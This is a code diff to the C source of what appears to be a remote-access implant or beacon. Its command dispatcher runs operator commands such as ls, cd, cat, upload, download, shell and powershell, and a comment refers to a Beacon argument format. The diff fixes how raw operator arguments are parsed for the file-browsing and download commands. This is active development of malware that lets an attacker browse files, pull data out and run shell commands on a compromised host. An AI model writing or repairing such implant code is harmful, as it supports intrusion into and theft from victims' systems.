@@ -531,16 +531,35 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
         mod_ps(&out);
     }
     else if (strcmp(name, "ls") == 0) {
-        const char *path = arg_extract_str(&ap);
-        mod_ls(&out, path);
+        /* Args come as raw string from operator, not BeaconDataParse format */
+        char *path_str = NULL;
+        if (args && args_len > 0) {
+            path_str = (char *)malloc(args_len + 1);
+            memcpy(path_str, args, args_len);
+            path_str[args_len] = '\0';
+        }
+        mod_ls(&out, path_str);
+        if (path_str) free(path_str);
     }
     else if (strcmp(name, "cd") == 0) {
-        const char *path = arg_extract_str(&ap);
-        mod_cd(&out, path);
+        char *path_str = NULL;
+        if (args && args_len > 0) {
+            path_str = (char *)malloc(args_len + 1);
+            memcpy(path_str, args, args_len);
+            path_str[args_len] = '\0';
+        }
+        mod_cd(&out, path_str);
+        if (path_str) free(path_str);
     }
     else if (strcmp(name, "cat") == 0) {
-        const char *path = arg_extract_str(&ap);
-        mod_cat(&out, path);
+        char *path_str = NULL;
+        if (args && args_len > 0) {
+            path_str = (char *)malloc(args_len + 1);
+            memcpy(path_str, args, args_len);
+            path_str[args_len] = '\0';
+        }
+        mod_cat(&out, path_str);
+        if (path_str) free(path_str);
     }
     else if (strcmp(name, "upload") == 0) {
         const char *path = arg_extract_str(&ap);
@@ -549,8 +568,14 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
         mod_upload(&out, path, data, data_len);
     }
     else if (strcmp(name, "download") == 0) {
-        const char *path = arg_extract_str(&ap);
-        mod_download(&out, path);
+        char *path_str = NULL;
+        if (args && args_len > 0) {
+            path_str = (char *)malloc(args_len + 1);
+            memcpy(path_str, args, args_len);
+            path_str[args_len] = '\0';
+        }
+        mod_download(&out, path_str ? path_str : "");
+        if (path_str) free(path_str);
     }
     else if (strcmp(name, "shell") == 0 || strcmp(name, "powershell") == 0) {
         /*
